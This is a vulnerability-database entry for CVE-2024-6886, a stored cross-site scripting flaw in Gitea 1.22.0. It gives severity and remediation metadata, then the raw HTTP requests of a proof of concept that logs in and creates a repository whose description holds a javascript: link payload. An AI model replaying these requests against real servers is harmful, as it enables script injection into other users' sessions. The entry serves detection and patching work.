---
layout: post
cve_id: CVE-2024-6886
title: Gitea 1.22.0 - Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2024/CVE-2024-6886.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-6886.yaml
snort2_rule: N/A
snort3_rule: N/A
author: soonghee2
severity: medium
impact: 'Authenticated attackers can inject malicious JavaScript into repository descriptions
  that executes in the context of other users'' sessions when they view the repository.

  '
remediation: 'Update Gitea to version 1.22.1 or later to address the stored XSS vulnerability.

  '
reference:
- https://www.exploit-db.com/exploits/52077
- https://nvd.nist.gov/vuln/detail/CVE-2024-6886
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:L
  cvss-score: 6.7
  cve-id: CVE-2024-6886
  cwe-id: CWE-79
  epss-score: 0.16577
  epss-percentile: 0.94697
  cpe: cpe:2.3:a:gitea:gitea:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 4
  vendor: gitea
  product: gitea
tags:
- cve
- cve2024
- gitea
- xss
- authenticated
- vuln
---

## üîç Vulnerability Description
Gitea 1.22.0 is vulnerable to a Stored Cross-Site Scripting (XSS) vulnerability. This vulnerability allows an attacker to inject malicious scripts that get stored on the server and executed in the context of another user's session.


## üåê HTTP Request
```nohighlight
POST /user/login HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586
Connection: close
Content-Length: 34
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
user_name=hwDapT&password=zUEcSc6g
```

```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.32 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /hwDapT HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /repo/create HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:109.0) Gecko/20100101 Firefox/115.0
Connection: close
Content-Length: 127
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
repo_name=38Er0QPrFDHxLQMcOjNt3AFCZE4&description=<a%20href="javascript:alert(document.domain)">XSS</a>&_csrf=KrrZZm&uid=K2nkpy
```

```nohighlight
GET /hwDapT HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

